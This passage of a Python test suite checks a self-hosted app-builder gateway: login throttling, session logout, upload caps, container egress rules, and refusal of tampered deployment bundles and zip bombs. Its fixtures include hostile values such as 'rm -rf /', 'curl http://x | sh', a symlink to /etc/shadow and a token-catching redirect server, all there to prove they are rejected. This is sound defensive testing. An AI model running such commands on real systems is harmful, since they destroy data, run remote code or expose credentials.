            accounts.delete("admin")


class _LiveGateway(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.gw = load_gateway()
        cls.srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), cls.gw.H)
        threading.Thread(target=cls.srv.serve_forever, daemon=True).start()
        cls.base = f"http://127.0.0.1:{cls.srv.server_address[1]}"

    @classmethod
    def tearDownClass(cls):
        cls.srv.shutdown(); cls.srv.server_close()

    def setUp(self):
        set_users(admin="admin", tester01="user", tester02="user")
        self.gw._LOGIN_FAILURES.clear()

    def login(self, name, pw=None, headers=None):
        req = urllib.request.Request(self.base + "/login", data=f"user={name}&password={pw or 'pw-' + name + '-0123456789'}".encode(),
                                     headers=headers or {})
        op = urllib.request.build_opener(_NoRedirect)
        try:
            r = op.open(req); return r.status, r.headers.get("Set-Cookie", "")
        except urllib.error.HTTPError as e:
            return e.code, e.headers.get("Set-Cookie", "") or ""

    def get(self, path, cookie):
        op = urllib.request.build_opener(_NoRedirect)
        try:
            return op.open(urllib.request.Request(self.base + path, headers={"Cookie": cookie})).status
        except urllib.error.HTTPError as e:
            return e.code


class _NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *a, **k):
        return None


def cookie_of(set_cookie):
    return set_cookie.split(";", 1)[0]


class LoginThrottling(_LiveGateway):
    def test_x_real_ip_only_from_nginx(self):
        class Fake:
            def __init__(self, peer, hdr): self.client_address, self.headers = (peer, 1), {"X-Real-IP": hdr}
        self.assertEqual(self.gw.client_ip(Fake("127.0.0.1", "203.0.113.9")), "203.0.113.9")
        self.assertEqual(self.gw.client_ip(Fake("198.51.100.7", "127.0.0.1")), "198.51.100.7")   # spoof ignored

    def test_rotating_addresses_still_lock_the_account(self):
        for i in range(self.gw.LOGIN_MAX_ACCOUNT_FAILURES):
            self.gw.record_login_failure(f"203.0.113.{i % 250}", "admin")
        self.assertFalse(self.gw.login_allowed("198.51.100.1", "admin"))
        self.assertTrue(self.gw.login_allowed("198.51.100.1", "tester01"))    # other accounts unaffected

    def test_per_address_limit_over_http(self):
        for _ in range(self.gw.LOGIN_MAX_FAILURES):
            self.assertEqual(self.login("tester01", "wrong")[0], 401)
        self.assertEqual(self.login("tester01")[0], 429)                      # even the right password waits

    def test_counters_survive_a_restart(self):
        self.gw.record_login_failure("203.0.113.5", "tester02")
        saved = json.loads((self.gw.GW_STATE / "login.json").read_text())
        self.assertIn("user:tester02", saved)

    def test_table_is_bounded(self):
        saved = self.gw.LOGIN_TABLE_MAX; self.gw.LOGIN_TABLE_MAX = 50
        try:
            for i in range(200):
                self.gw.record_login_failure(f"10.0.{i // 250}.{i % 250}")
            self.assertLessEqual(len(self.gw._LOGIN_FAILURES), 50)
        finally:
            self.gw.LOGIN_TABLE_MAX = saved


class LogoutEndsTheSession(_LiveGateway):
    def test_logout_revokes_the_token_itself(self):
        code, sc = self.login("tester01"); c = cookie_of(sc)
        self.assertEqual(code, 302); self.assertEqual(self.get("/builds", c), 200)
        self.get("/logout", c)
        self.assertEqual(self.get("/builds", c), 302)            # the old cookie, replayed: back to login

    def test_logout_everywhere(self):
        c1 = cookie_of(self.login("tester02")[1]); c2 = cookie_of(self.login("tester02")[1])
        self.get("/logout-all", c1)
        self.assertEqual(self.get("/builds", c1), 302); self.assertEqual(self.get("/builds", c2), 302)

    def test_sessions_last_12_hours_by_default(self):
        self.assertEqual(self.gw.SESSION_TTL, 43200)


class UploadLimits(_LiveGateway):
    def upload(self, cookie, size=100):
        req = urllib.request.Request(self.base + "/upload", data=b"x" * size, method="POST",
                                     headers={"Cookie": cookie, "Content-Type": "application/zip"})
        try:
            return urllib.request.urlopen(req).status
        except urllib.error.HTTPError as e:
            return e.code

    def test_active_builds_cap(self):
        for _ in range(self.gw.MAX_ACTIVE_BUILDS):
            builds.create("tester01", origin="web")
        self.assertIn("builds running", self.gw.upload_refusal({"name": "tester01", "role": "user"}, 10))
        self.assertEqual(self.upload(cookie_of(self.login("tester01")[1])), 429)
        self.assertIsNone(self.gw.upload_refusal({"name": "admin", "role": "admin"}, 10))

    def test_daily_allowance(self):
        saved = self.gw.MAX_DAILY_UPLOAD; self.gw.MAX_DAILY_UPLOAD = 1000
        try:
            b = builds.create("tester02", origin="web", bundle_bytes=900); builds.update(b["id"], state=builds.FAILED)
            self.assertIn("allowance", self.gw.upload_refusal({"name": "tester02", "role": "user"}, 200))
            self.assertIsNone(self.gw.upload_refusal({"name": "tester02", "role": "user"}, 50))
        finally:
            self.gw.MAX_DAILY_UPLOAD = saved

    def test_disk_floor_applies_to_everyone(self):
        saved = self.gw.DISK_RESERVE; self.gw.DISK_RESERVE = 1 << 62
        try:
            self.assertIn("disk space", self.gw.upload_refusal({"name": "admin", "role": "admin"}, 1))
        finally:
            self.gw.DISK_RESERVE = saved


class FrontDoorCaps(_LiveGateway):
    def test_server_wide_daily_cap_and_persistence(self):
        saved = (self.gw.FD_TOTAL_PER_DAY, self.gw.FD_PER_MIN)
        self.gw.FD_TOTAL_PER_DAY, self.gw.FD_PER_MIN = 3, 100
        self.gw._FD_DAY.update(day="", users={}, total=0); self.gw._FD_USE.clear()
        try:
            got = [self.gw._fd_allowed(u) for u in ("a", "b", "c", "d")]
            self.assertEqual(got, [True, True, True, False])
            self.assertEqual(json.loads((self.gw.GW_STATE / "frontdoor.json").read_text())["total"], 3)
        finally:
            self.gw.FD_TOTAL_PER_DAY, self.gw.FD_PER_MIN = saved


class DangerousSwitchesRefusedOnServers(unittest.TestCase):
    def run_py(self, code, **env):
        e = {**os.environ, "APP_BUILDER_SESSION_SECRET": "s" * 40, **env}
        return subprocess.run([sys.executable, "-c", code], cwd=DEP, capture_output=True, text=True, env=e, timeout=60)

    def test_auth_disabled_refused_under_systemd_or_public_host(self):
        r = self.run_py("import gateway", APP_BUILDER_AUTH_DISABLED="1", INVOCATION_ID="abc")
        self.assertNotEqual(r.returncode, 0); self.assertIn("laptop only", r.stderr)
        r = self.run_py("import gateway", APP_BUILDER_AUTH_DISABLED="1", APP_BUILDER_HOST="0.0.0.0")
        self.assertNotEqual(r.returncode, 0)

    def test_harden_off_ignored_on_a_server(self):
        r = self.run_py("import app_runner; print(app_runner.HARDEN)", APP_BUILDER_HARDEN="false", INVOCATION_ID="abc")
        self.assertEqual(r.stdout.strip().splitlines()[-1], "True")
        r = self.run_py("import app_runner; print(app_runner.HARDEN)", APP_BUILDER_HARDEN="false", INVOCATION_ID="")
        self.assertEqual(r.stdout.strip().splitlines()[-1], "False")    # a laptop may still turn it off


# ============================================================================ #15 pinned dependencies, Coolify token

import coolify_handoff  # noqa: E402


class PinnedDependencies(unittest.TestCase):
    def test_requirements_are_exact(self):
        lines = [l.strip() for l in (DEP / "requirements-server.txt").read_text().splitlines()
                 if l.strip() and not l.lstrip().startswith("#")]
        self.assertEqual(sorted(l.split("==")[0] for l in lines), ["anthropic", "playwright", "pyyaml"])
        for l in lines:
            self.assertRegex(l, r"^[a-z0-9-]+==\d+(\.\d+)+$", l)

    def test_bootstrap_installs_the_pins_and_nothing_unpinned(self):
        # v117: installed by atta_install_browser (bootstrap-lib.sh) from the NEW release's own folder, before the switch.
        b = (DEP / "bootstrap.sh").read_text() + (DEP / "bootstrap-lib.sh").read_text()
        self.assertIn('-r "$ATTA_LIB_DIR/requirements-server.txt"', b)
        self.assertIn('atta_install_browser "$OS"', b)
        self.assertNotRegex(b, r"pip_install (playwright|anthropic|pyyaml)\b")

    def test_coolify_zip_checksum_is_pinned_and_matches(self):
        import hashlib
        sh_ = (HERE.parent / "05-coolify" / "install-coolify.sh").read_text()
        want = re.search(r'COOLIFY_ZIP_SHA256:-([0-9a-f]{64})', sh_).group(1)
        z = HERE.parent / "05-coolify" / "coolify-main.zip"
        if z.is_file():
            self.assertEqual(hashlib.sha256(z.read_bytes()).hexdigest(), want)

    @unittest.skipUnless(os.geteuid() == 0, "the installer insists on root before it checks anything")
    def test_coolify_installer_refuses_a_different_zip(self):
        d = Path(tempfile.mkdtemp(dir=TMP))
        shutil.copy(HERE.parent / "05-coolify" / "install-coolify.sh", d)
        (d / "coolify-main.zip").write_bytes(b"not the supplied zip")
        r = subprocess.run(["bash", str(d / "install-coolify.sh")], capture_output=True, text=True, timeout=60)
        self.assertNotEqual(r.returncode, 0); self.assertIn("REFUSED", r.stderr)
        self.assertFalse(Path("/opt/coolify-source").exists() and (d / "unzipped").exists())


class CoolifyTokenTravelsSafely(unittest.TestCase):
    def setUp(self):
        self.saved = (coolify_handoff.COOLIFY_URL, os.environ.get("COOLIFY_ALLOW_HTTP"))

    def tearDown(self):
        coolify_handoff.COOLIFY_URL = self.saved[0]
        os.environ.pop("COOLIFY_ALLOW_HTTP", None)
        if self.saved[1] is not None:
            os.environ["COOLIFY_ALLOW_HTTP"] = self.saved[1]

    def route(self, url):
        coolify_handoff.COOLIFY_URL = url
        return coolify_handoff.token_route_ok()[0]

    def test_routes(self):
        with _FakeDNS({**DNS, "coolify.internal-vpc.example": "10.0.3.7", "coolify.example.org": "93.184.215.30"}):
            self.assertTrue(self.route("https://coolify.example.org"))
            self.assertTrue(self.route("http://10.0.3.7:8000"))
            self.assertTrue(self.route("http://127.0.0.1:8000"))
            self.assertTrue(self.route("http://coolify.internal-vpc.example:8000"))
            self.assertFalse(self.route("http://coolify.example.org:8000"))        # public + plain http
            self.assertFalse(self.route("http://93.184.215.30:8000"))
            self.assertFalse(self.route("ftp://10.0.3.7"))
            os.environ["COOLIFY_ALLOW_HTTP"] = "true"
            self.assertTrue(self.route("http://coolify.example.org:8000"))        # the owner's explicit choice

    def test_refused_route_sends_nothing(self):
        with _FakeDNS({**DNS, "coolify.example.org": "93.184.215.30"}):
            coolify_handoff.COOLIFY_URL = "http://coolify.example.org:8000"
            ok, why = coolify_handoff._deploy("uuid-1")
        self.assertFalse(ok); self.assertTrue(why.startswith("REFUSED"))

    def test_redirect_never_carries_the_token(self):
        got = []
        class Catch(_Quiet):
            def do_POST(self):
                got.append(self.headers.get("Authorization")); self.send_response(200); self.end_headers()
            do_GET = do_POST
        thief = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Catch)
        class Redirect(_Quiet):
            def do_POST(self):
                self.send_response(302); self.send_header("Location", f"http://127.0.0.1:{thief.server_address[1]}/x")
                self.end_headers()
        front = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Redirect)
        for srv in (thief, front):
            threading.Thread(target=srv.serve_forever, daemon=True).start()
        saved_tok = coolify_handoff.COOLIFY_TOKEN
        try:
            coolify_handoff.COOLIFY_URL = f"http://127.0.0.1:{front.server_address[1]}"
            coolify_handoff.COOLIFY_TOKEN = "coolify-secret-token"
            ok, _ = coolify_handoff._deploy("uuid-2")
            self.assertFalse(ok)
            self.assertEqual(got, [])                                   # the redirect target saw nothing
        finally:
            coolify_handoff.COOLIFY_TOKEN = saved_tok
            for srv in (thief, front):
                srv.shutdown(); srv.server_close()


# ============================================================================ #10 what app containers can reach

EGRESS = DEP / "container-egress.sh"
CAN_NETNS = os.geteuid() == 0 and shutil.which("ip") and shutil.which("iptables") and \
    subprocess.run(["ip", "netns", "add", "atta-cap-probe"], capture_output=True).returncode == 0
if CAN_NETNS:
    subprocess.run(["ip", "netns", "del", "atta-cap-probe"], capture_output=True)

SERVE = ("import socket,sys,threading\n"
         "for a in sys.argv[1:]:\n"
         " h,p=a.rsplit(':',1); s=socket.socket(); s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1); s.bind((h,int(p))); s.listen(8)\n"
         " threading.Thread(target=lambda s=s:[c.close() for c in iter(lambda:s.accept()[0],None)],daemon=True).start()\n"
         "import time; time.sleep(3600)\n")


@unittest.skipUnless(CAN_NETNS, "needs root and network namespaces")
class ContainersReachOnlyWhatTheyShould(unittest.TestCase):
    """Real packets through the real rules: a host with a Docker-style bridge, two containers, an outside network."""
    NS = ("attaE-h", "attaE-c1", "attaE-c2", "attaE-net")

    def ns(self, name, *cmd, check=True):
        return subprocess.run(["ip", "netns", "exec", name, *cmd], capture_output=True, text=True, check=check)

    def setUp(self):
        self.procs = []
        for n in self.NS:
            subprocess.run(["ip", "netns", "del", n], capture_output=True)
            subprocess.run(["ip", "netns", "add", n], check=True)
            self.ns(n, "ip", "link", "set", "lo", "up")
        h, c1, c2, net = self.NS
        sh = lambda *c: subprocess.run(c, check=True, capture_output=True)
        self.ns(h, "ip", "link", "add", "br-atta0", "type", "bridge")
        self.ns(h, "ip", "addr", "add", "172.30.0.1/24", "dev", "br-atta0"); self.ns(h, "ip", "link", "set", "br-atta0", "up")
        for i, c in ((2, c1), (3, c2)):
            sh("ip", "link", "add", f"vc{i}", "type", "veth", "peer", "name", f"vh{i}")
            sh("ip", "link", "set", f"vc{i}", "netns", c); sh("ip", "link", "set", f"vh{i}", "netns", h)
            self.ns(h, "ip", "link", "set", f"vh{i}", "master", "br-atta0"); self.ns(h, "ip", "link", "set", f"vh{i}", "up")
            self.ns(c, "ip", "addr", "add", f"172.30.0.{i}/24", "dev", f"vc{i}"); self.ns(c, "ip", "link", "set", f"vc{i}", "up")
            self.ns(c, "ip", "route", "add", "default", "via", "172.30.0.1")
        sh("ip", "link", "add", "vn", "type", "veth", "peer", "name", "vhn")
        sh("ip", "link", "set", "vn", "netns", net); sh("ip", "link", "set", "vhn", "netns", h)
        self.ns(h, "ip", "addr", "add", "203.0.113.1/30", "dev", "vhn"); self.ns(h, "ip", "link", "set", "vhn", "up")
        self.ns(net, "ip", "addr", "add", "203.0.113.2/30", "dev", "vn"); self.ns(net, "ip", "link", "set", "vn", "up")
        self.ns(net, "ip", "route", "add", "172.30.0.0/24", "via", "203.0.113.1")
        for a in ("198.51.100.10", "10.9.9.9", "169.254.169.254", "100.64.1.1"):
            self.ns(net, "ip", "addr", "add", f"{a}/32", "dev", "lo")
            self.ns(h, "ip", "route", "add", f"{a}/32", "via", "203.0.113.2")
        self.ns(h, "sysctl", "-qw", "net.ipv4.ip_forward=1")
        self.ns(h, "iptables", "-N", "DOCKER-USER"); self.ns(h, "iptables", "-I", "FORWARD", "-j", "DOCKER-USER")
        for n, addrs in ((net, ["0.0.0.0:80", "10.9.9.9:53"]), (h, ["172.30.0.1:8081"]), (c2, ["172.30.0.3:8080"]),
                         (c1, ["172.30.0.2:9000"])):
            self.procs.append(subprocess.Popen(["ip", "netns", "exec", n, sys.executable, "-c", SERVE, *addrs]))
        time.sleep(0.8)

    def tearDown(self):
        for p in self.procs:
            p.kill(); p.wait()
        for n in self.NS:
            subprocess.run(["ip", "netns", "del", n], capture_output=True)

    def reach(self, frm, host, port):
        r = self.ns(frm, sys.executable, "-c", f"import socket;socket.create_connection(('{host}',{port}),timeout=1.5)", check=False)
        return r.returncode == 0

    def apply(self, mode):
        r = subprocess.run(["ip", "netns", "exec", self.NS[0], "bash", str(EGRESS)], capture_output=True, text=True,
                           env={**os.environ, "APP_BUILDER_APP_EGRESS": mode})
        self.assertEqual(r.returncode, 0, r.stderr)

    def test_before_any_rule_everything_is_reachable(self):
        c1 = self.NS[1]
        for dst in (("198.51.100.10", 80), ("10.9.9.9", 80), ("169.254.169.254", 80), ("172.30.0.1", 8081)):
            self.assertTrue(self.reach(c1, *dst), dst)                 # proves the blocks below are the rules' doing

    def test_public_mode(self):
        self.apply("public")
        c1, net = self.NS[1], self.NS[3]
        self.assertTrue(self.reach(c1, "198.51.100.10", 80))          # the internet
        self.assertTrue(self.reach(c1, "172.30.0.3", 8080))           # another container on its network
        self.assertTrue(self.reach(c1, "10.9.9.9", 53))               # a private DNS resolver
        for dst in (("169.254.169.254", 80), ("10.9.9.9", 80), ("100.64.1.1", 80), ("172.30.0.1", 8081)):
            self.assertFalse(self.reach(c1, *dst), dst)               # metadata, VPC, CGNAT, this host
        self.assertTrue(self.reach(net, "172.30.0.2", 9000))          # connections INTO a container still work

    def test_deny_mode(self):
        self.apply("deny")
        c1 = self.NS[1]
        self.assertFalse(self.reach(c1, "198.51.100.10", 80))
        self.assertTrue(self.reach(c1, "172.30.0.3", 8080))
        self.assertFalse(self.reach(c1, "169.254.169.254", 80))

    def test_idempotent(self):
        self.apply("public"); first = self.ns(self.NS[0], "iptables-save").stdout
        self.apply("public"); second = self.ns(self.NS[0], "iptables-save").stdout
        strip = lambda t: [l for l in t.splitlines() if not l.startswith(("#", ":"))]
        self.assertEqual(strip(first), strip(second))


# ============================================================================ strict bundles, deploy test gate, zip limits

from adm import staging as adm_staging  # noqa: E402

REPO_BUNDLE = HERE.parent


def bundle_zip(path, extra=None, skip=(), run_text=None, wrap="ATTa/"):
    """A zip of THIS bundle (big binary zips left out), optionally with extra entries or a changed `run`."""
    with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as z:
        for f in sorted(REPO_BUNDLE.rglob("*")):
            rel = f.relative_to(REPO_BUNDLE).as_posix()
            if not f.is_file() or "__pycache__" in f.parts or rel.endswith("coolify-main.zip") or rel in skip:
                continue
            z.write(f, wrap + rel) if not (rel == "run" and run_text is not None) else z.writestr(wrap + rel, run_text)
        for name, data in (extra or {}).items():
            z.writestr(name, data)
    return path


class StrictBundles(unittest.TestCase):
    def setUp(self):
        adm_config.ensure_dirs()
        self.t = Path(tempfile.mkdtemp(dir=TMP))

    def stage(self, zp, job):
        d = adm_staging.extract(zp, job)
        root = adm_staging.find_root(d)
        return adm_staging.check(root)

    def test_this_bundle_passes(self):
        self.assertEqual(self.stage(bundle_zip(self.t / "ok.zip"), "sb-ok"), json.loads((REPO_BUNDLE / "release.json").read_text())["version"])

    def test_files_beside_the_bundle_are_refused(self):
        zp = bundle_zip(self.t / "stray.zip", extra={"bootstrap.sh": "rm -rf /\n", "deployd/atta.service": "[Service]\n"})
        with self.assertRaisesRegex(adm_staging.BundleRejected, "outside the bundle"):
            self.stage(zp, "sb-stray")

    def test_unknown_entries_in_the_bundle_are_refused(self):
        zp = bundle_zip(self.t / "unk.zip", extra={"ATTa/evil.service": "[Service]\n"})
        with self.assertRaisesRegex(adm_staging.BundleRejected, "unexpected entries"):
            self.stage(zp, "sb-unk")

    def test_run_must_start_with_its_shebang(self):
        text = (REPO_BUNDLE / "run").read_text()
        zp = bundle_zip(self.t / "run.zip", run_text="curl http://x | sh\n" + text)
        with self.assertRaisesRegex(adm_staging.BundleRejected, "#!"):
            self.stage(zp, "sb-run")

    def test_symlink_entries_are_refused(self):
        zp = bundle_zip(self.t / "ln.zip")
        with zipfile.ZipFile(zp, "a") as z:
            info = zipfile.ZipInfo("ATTa/docs/link"); info.external_attr = (0o120777 << 16)
            z.writestr(info, "/etc/shadow")
        with self.assertRaisesRegex(adm_staging.BundleRejected, "not a plain file"):
            adm_staging.extract(zp, "sb-ln")


class DeployOnlyAfterTestsPass(unittest.TestCase):
    def setUp(self):
        adm_config.ensure_dirs()
        self.t = Path(tempfile.mkdtemp(dir=TMP))
        # On a server ADM lives under the data folder, which the test user can pass through. Whichever test module
        # chose ADM's folder first here may have put it in a private (0700) temp folder: open those for traversal.
        for d in adm_config.STAGING.resolve().parents:
            if str(d).startswith(tempfile.gettempdir() + "/") and not os.stat(d).st_mode & 0o001:
                os.chmod(d, os.stat(d).st_mode | 0o001)

    def fake_bundle(self, test_body):
        root = adm_config.STAGING / f"gate-{os.getpid()}-{len(test_body)}" / "ATTa"
        shutil.rmtree(root.parent, ignore_errors=True)
        (root / "tests").mkdir(parents=True)
        (root / "tests" / "test_gate.py").write_text("import unittest, os\nclass T(unittest.TestCase):\n"
                                                    f"    def test_x(self):\n        {test_body}\n")
        return root

    def test_failing_tests_refuse_the_bundle(self):
        with self.assertRaisesRegex(adm_staging.BundleRejected, "tests failed"):
            adm_staging.run_tests(self.fake_bundle("self.assertTrue(False)"), SINK)

    def test_missing_tests_refuse_the_bundle(self):
        root = self.fake_bundle("pass"); shutil.rmtree(root / "tests")
        with self.assertRaisesRegex(adm_staging.BundleRejected, "no tests"):
            adm_staging.run_tests(root, SINK)

    @unittest.skipUnless(os.geteuid() == 0, "dropping to the test user needs root")
    def test_tests_run_unprivileged_without_secrets(self):
        probe = Path(f"/tmp/atta-gate-probe-{os.getpid()}"); probe.unlink(missing_ok=True)
        os.environ["APP_BUILDER_SESSION_SECRET_PROBE"] = "must-not-leak"
        try:
            body = (f"open({str(probe)!r},'w').write(str(os.getuid())+' '+str(os.getgroups())+' '"
                    "+str('APP_BUILDER_SESSION_SECRET_PROBE' in os.environ))")
            adm_staging.run_tests(self.fake_bundle(body), SINK)
            uid, groups, leaked = probe.read_text().split(" ", 2)
            self.assertEqual(int(uid), pwd.getpwnam("nobody").pw_uid)
            self.assertEqual(leaked.strip(), "False")
        finally:
            os.environ.pop("APP_BUILDER_SESSION_SECRET_PROBE", None); probe.unlink(missing_ok=True)

    @unittest.skipUnless(os.geteuid() == 0 and os.environ.get("ATTA_TEST_GATE_FULL") == "1",
                         "the full real-bundle gate (~2 min) runs with ATTA_TEST_GATE_FULL=1")
    def test_this_bundle_passes_its_own_gate(self):
        d = adm_staging.extract(bundle_zip(self.t / "gate.zip"), "gate-real")
        root = adm_staging.find_root(d); adm_staging.check(root)
        self.assertIn("Ran ", adm_staging.run_tests(root, SINK))


class AppZipLimits(unittest.TestCase):
    def setUp(self):
        self.saved = (pipeline.MAX_ARCHIVE_FILES, pipeline.MAX_EXTRACTED)
        self.t = Path(tempfile.mkdtemp(dir=TMP))

    def tearDown(self):
        pipeline.MAX_ARCHIVE_FILES, pipeline.MAX_EXTRACTED = self.saved

    def test_entry_cap(self):
        pipeline.MAX_ARCHIVE_FILES = 5
        zp = self.t / "many.zip"
        with zipfile.ZipFile(zp, "w") as z:
            for i in range(6):
                z.writestr(f"f{i}", "x")
        with zipfile.ZipFile(zp) as z, self.assertRaisesRegex(RuntimeError, "entries"):
            pipeline.extract(z, self.t / "out1")

    def test_zip_bomb(self):
        zp = self.t / "bomb.zip"
        with zipfile.ZipFile(zp, "w", zipfile.ZIP_DEFLATED) as z:
            z.writestr("big.bin", b"\0" * (60 * 1024**2))
        with zipfile.ZipFile(zp) as z, self.assertRaisesRegex(RuntimeError, "compression ratio"):
            pipeline.extract(z, self.t / "out2")

    def test_bytes_written_are_counted(self):
        pipeline.MAX_EXTRACTED = 10_000
        zp = self.t / "size.zip"
        with zipfile.ZipFile(zp, "w", zipfile.ZIP_STORED) as z:
            z.writestr("a.bin", os.urandom(6000)); z.writestr("b.bin", os.urandom(6000))
        with zipfile.ZipFile(zp) as z, self.assertRaisesRegex(RuntimeError, "size exceeds"):
            pipeline.extract(z, self.t / "out3")


if __name__ == "__main__":
    unittest.main()
